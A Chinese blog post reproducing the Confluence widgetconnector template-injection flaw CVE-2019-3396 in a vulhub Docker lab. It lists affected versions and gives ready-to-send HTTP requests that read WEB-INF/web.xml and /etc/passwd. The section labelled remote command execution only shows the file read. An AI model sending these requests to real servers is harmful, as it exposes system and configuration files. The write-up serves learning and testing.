---
layout:     post
title:      【漏洞复现】confluence远程代码执行漏洞(CVE-2019-3396)
subtitle:   远程代码执行漏洞
date:       2020-11-11
author:     matrix
header-img: img/websecurity.jpeg
catalog: true
tags:
    - 漏洞复现 - 远程代码执行漏洞
---
## 0x00 漏洞说明
Confluence是一个专业的企业知识管理与协同软件，常用于构建企业wiki。它强大的编辑和站点管理特征能够帮助团队成员之间共享信息、文档协作、集体讨论，信息推送。其中Confluence Server和Data Center产品中使用的小工具连接器widgetconnecter组件（版本<=3.1.3）中存在服务器端模板注入漏洞（SSTI）。
攻击者可利用该漏洞对系统进行路径遍历、服务端请求伪造（SSRF）、远程代码执行（RCE）
## 0x01 影响版本
### 产品
Confluence Server
Confluence Data Center
2.0.0 <= version < 6.6.13
6.7.0 <= version < 6.12.4
6.13.0 <= version < 6.13.4
6.14.0 <= version < 6.14.3
6.15.0 <= version < 6.15.2
### 组件
widgetconnector
version <= 3.1.3## 0x02 复现环境
vulhub
## 0x03 漏洞复现
### 0、环境搭建
docker-compose up -d
![-c1596](/img/16050835682883.jpg)
![-c1621](/img/16050838207076.jpg)

serverID:B57H-6NLA-AC9K-HXR7
![-c1139](/img/16050840799162.jpg)
![-c1146](/img/16050841402196.jpg)
![-c705](/img/16050857569665.jpg)
![-c820](/img/16050873798223.jpg)
![-c1791](/img/16050878611758.jpg)
### 1、漏洞利用
#### 本地文件读取
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: 10.32.112.95:8090
Content-Type: application/json
Referer: http://10.32.112.95:8090/
Content-Length: 171

{"contentId":"0","macro":{"name":"widget","body":"","params":{"url":"metacafe.com","width":"300","height":"200","_template":"WEB-INF/web.xml"}}}
```
![-c1786](/img/16051456167539.jpg)
#### 远程命令执行
```
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: 10.32.112.95:8090
Content-Type: application/json
Referer: http://10.32.112.95:8090/
Content-Length: 147

{"contentId":"0","macro":{"name":"widget","body":"","params":{"url":"metacafe.com","width":"300","height":"200","_template":"file:///etc/passwd"}}}
```
![-c1786](/img/16051470391309.jpg)

